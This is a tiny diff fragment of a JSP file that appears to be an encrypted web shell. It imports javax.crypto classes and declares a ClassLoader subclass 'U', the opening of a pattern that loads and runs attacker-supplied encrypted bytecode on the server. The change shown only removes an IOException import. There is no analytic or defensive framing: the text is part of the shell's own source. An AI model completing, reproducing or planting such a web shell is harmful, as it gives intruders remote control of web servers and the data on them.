@@ -1,5 +1,4 @@
 <%@page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec"%>
-<%@ page import="java.io.IOException" %>
 <%!class U extends ClassLoader{
     U(ClassLoader c){
         super(c);
